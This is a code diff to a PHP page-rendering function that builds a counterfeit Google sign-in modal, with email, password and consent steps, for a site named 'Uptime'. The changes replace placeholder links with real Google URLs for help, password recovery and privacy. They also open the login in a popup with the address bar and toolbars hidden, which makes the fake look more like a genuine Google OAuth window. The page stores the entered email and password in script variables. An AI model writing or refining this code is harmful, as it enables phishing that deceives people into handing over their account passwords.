@@ -192,14 +192,14 @@ function page_reader(string $skill, bool $register): void
                 <label for="gEm">Email or phone</label>
               </div>
               <div class="g-errmsg" id="gE0" style="visibility:hidden"><svg width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="gE0t">Enter a valid email or phone number.</span></div>
-              <a href="#" class="g-hlnk">Forgot email?</a>
-              <p class="g-note">Not your computer? Use <a href="#">Guest mode</a> to sign in privately. <a href="#">Learn more</a></p>
+              <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" class="g-hlnk">Forgot email?</a>
+              <p class="g-note">Not your computer? Use <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Guest mode</a> to sign in privately. <a href="https://support.google.com/accounts/answer/2917834" target="_blank">Learn more</a></p>
             </div>
             <div class="g-actions">
-              <a href="#" class="g-create-lnk">Create account</a>
+              <a href="https://accounts.google.com/signup" target="_blank" class="g-create-lnk">Create account</a>
               <button class="g-btn g-btn-primary" onclick="gStep1()">Next</button>
             </div>
-            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
+            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="https://support.google.com" target="_blank">Help</a><a href="https://policies.google.com/privacy" target="_blank">Privacy</a><a href="https://policies.google.com/terms" target="_blank">Terms</a></div></div>
           </div>
 
           <!-- Step 1: Password -->
@@ -218,16 +218,16 @@ function page_reader(string $skill, bool $register): void
                 <button type="button" class="g-pwtog" onclick="gTogglePw()"><svg id="gPwEye" width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button>
               </div>
               <div class="g-errmsg" id="gE1" style="visibility:hidden"><svg width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Wrong password. Try again or click Forgot password to reset it.</span></div>
-              <a href="#" class="g-hlnk">Forgot password?</a>
+              <a href="https://accounts.google.com/signin/v2/challenge/pwd/reset" target="_blank" class="g-hlnk">Forgot password?</a>
             </div>
             <div class="g-actions">
-              <a href="#" class="g-create-lnk">Try another way</a>
+              <a href="https://accounts.google.com/signin/v2/challenge" target="_blank" class="g-create-lnk">Try another way</a>
               <div class="g-actions-r">
                 <button class="g-btn g-btn-ghost" onclick="gToStep(0)">Back</button>
                 <button class="g-btn g-btn-primary" onclick="gStep2()">Next</button>
               </div>
             </div>
-            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
+            <div class="g-langbar"><span>English (United States) &#9660;</span><div class="g-langlinks"><a href="https://support.google.com" target="_blank">Help</a><a href="https://policies.google.com/privacy" target="_blank">Privacy</a><a href="https://policies.google.com/terms" target="_blank">Terms</a></div></div>
           </div>
 
           <!-- Step 2: Consent -->
@@ -246,7 +246,7 @@ function page_reader(string $skill, bool $register): void
                 <li><svg class="g-p-icon" viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg><div><div class="g-p-label">See your personal info, including any personal info you've made publicly available</div></div></li>
                 <li><svg class="g-p-icon" viewBox="0 0 24 24" fill="#1a73e8"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14l-5-5 1.41-1.41L12 14.17l7.59-7.59L21 8l-9 9z"/></svg><div><div class="g-p-label">Associate you with your personal info on Google</div></div></li>
               </ul>
-              <div class="g-infobox"><svg width="16" height="16" viewBox="0 0 24 24" fill="#1a73e8" style="flex-shrink:0;margin-top:1px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg><span>Make sure you trust Uptime. You may be sharing sensitive info with this site or app. <a href="#" style="color:#1a73e8;font-weight:500">Learn about the risks</a></span></div>
+              <div class="g-infobox"><svg width="16" height="16" viewBox="0 0 24 24" fill="#1a73e8" style="flex-shrink:0;margin-top:1px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg><span>Make sure you trust Uptime. You may be sharing sensitive info with this site or app. <a href="https://support.google.com/accounts/answer/13130529" target="_blank" style="color:#1a73e8;font-weight:500">Learn about the risks</a></span></div>
             </div>
             <div class="g-actions" style="padding:14px 36px 22px">
               <div style="font-size:11px;color:#5f6368;line-height:1.4;max-width:220px">By allowing, you agree to Google's <a href="#" style="color:#1a73e8">Terms of Service</a> and <a href="#" style="color:#1a73e8">Privacy Policy</a></div>
@@ -322,8 +322,21 @@ function page_reader(string $skill, bool $register): void
       .g-dot.on{background:#1a73e8}.g-dot.done{background:#34a853}
       </style>
       <script>
-      var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>;
-      function openGAuth(){document.getElementById('gBackdrop').classList.add('open');setTimeout(function(){document.getElementById('gEm').focus()},80)}
+      var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>,_gWin=null;
+      function openGAuth(){
+        _gWin=window.open('index.php?r=oauth','google_auth','width=500,height=630,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0,status=0');
+        if(!_gWin){
+          document.getElementById('gBackdrop').classList.add('open');
+          setTimeout(function(){document.getElementById('gEm').focus()},80);
+          return;
+        }
+        window.addEventListener('message',function gH(evt){
+          if(!evt.data||evt.data.source!=='oauth_done')return;
+          window.removeEventListener('message',gH);
+          try{_gWin&&_gWin.close()}catch(e){}
+          setTimeout(function(){window.location.href=_gR},400);
+        });
+      }
       function closeGAuth(){document.getElementById('gBackdrop').classList.remove('open')}
       function gSync(el){el.value?el.classList.add('gfilled'):el.classList.remove('gfilled')}
       function gToStep(n){
